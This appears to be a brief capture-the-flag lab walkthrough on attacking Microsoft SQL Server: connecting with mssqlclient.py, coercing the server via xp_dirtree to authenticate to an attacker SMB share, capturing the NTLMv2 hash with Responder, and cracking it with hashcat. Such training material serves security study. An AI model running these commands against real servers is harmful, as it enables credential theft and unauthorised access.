# Microsoft SQL server (ms-sql)

<img width="983" height="622" alt="image" src="https://github.com/user-attachments/assets/4e636476-257e-4627-9b74-03a67855a998" />

MySQL Vs Mssql

<img width="1113" height="598" alt="image" src="https://github.com/user-attachments/assets/afce9f05-5e1e-44cb-8573-d2ea3a884b36" />

Q1.What is the password for the "mssqlsvc" user?

## Use mssqlclient.py

mssqlclient.py htbdbuser@10.129.203.12

## Check current user and check it is sysadmin (administrator)
```
SQL (htbdbuser  guest@master)> SELECT SYSTEM_USER;
SQL (htbdbuser  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
```

## MSSQL server authenticates to attacker SMB server to capture NTLM2 hash

```
SQL (htbdbuser  guest@master)>EXEC master..xp_dirtree '\\Attacker-IP\share\';
```

## Use Responder to listen 

```
sudo responder -I tun0
```

<img width="997" height="432" alt="image" src="https://github.com/user-attachments/assets/e5e519af-a32d-45c8-8e15-7831d45ea6c1" />

## Crack the hash
```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

